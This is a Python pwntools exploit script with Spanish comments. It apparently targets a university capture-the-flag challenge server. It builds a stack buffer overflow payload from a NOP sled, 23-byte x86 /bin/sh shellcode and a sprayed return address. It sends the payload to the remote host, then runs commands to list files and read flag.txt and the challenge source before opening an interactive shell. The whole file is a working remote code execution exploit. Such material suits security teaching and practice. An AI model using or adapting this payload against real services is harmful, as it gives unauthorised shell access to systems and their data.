from pwn import *
import sys

# --- CONFIGURACIÓN ---
host = "ic.catedras.linti.unlp.edu.ar"
port = 15009
buffer_address = 0xFFFFDE30  # Tu dirección estática

# --- CONSTRUCCIÓN DEL PAYLOAD ---
# 1. NOP Sled + Shellcode (debe ser menor a 64 bytes para entrar en el buffer)
#    Usamos una shellcode muy pequeña y fiable de 23 bytes.
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
nops = b"\x90" * (
    60 - len(shellcode)
)  # Rellenamos hasta llegar casi al final del buffer

parte_inicial = nops + shellcode  # Esto va al inicio (0xffffde30)

# 2. El "Spray" de direcciones
#    Repetimos la dirección de retorno muchas veces.
#    Cualquiera de estas que caiga en el EIP hará que el programa salte al principio (parte_inicial).
direccion_retorno = p32(buffer_address)
spray = direccion_retorno * 30  # Repetimos la dirección 30 veces (120 bytes)

# Payload Final: [ Buffer con Shellcode ] + [ Direcciones Direcciones Direcciones ... ]
payload = parte_inicial + spray

print(f"[*] Payload length: {len(payload)} bytes")
print(f"[*] Enviando ataque a {host}:{port}...")

try:
    # Usamos remote() de pwntools
    p = remote(host, port)

    # Recibimos el prompt
    p.recvuntil(b"Ingrese su input:")

    # Enviamos el ataque
    p.sendline(payload)

    # Consumimos el leak (si aparece)
    try:
        p.recvline()
    except:
        pass

    print("[*] Payload enviado. Intentando abrir shell...")

    # --- TRUCO IMPORTANTE ---
    # Enviamos un comando sucio para ver si hay vida antes de pasar a interactivo
    p.sendline(b"echo ESTOY_ADENTRO; ls; cat flag.txt; cat reto.c")

    # Pasamos a modo interactivo directamente.
    # A veces recv() da timeout aunque la shell esté viva.
    p.interactive()

except Exception as e:
    print(f"Error: {e}")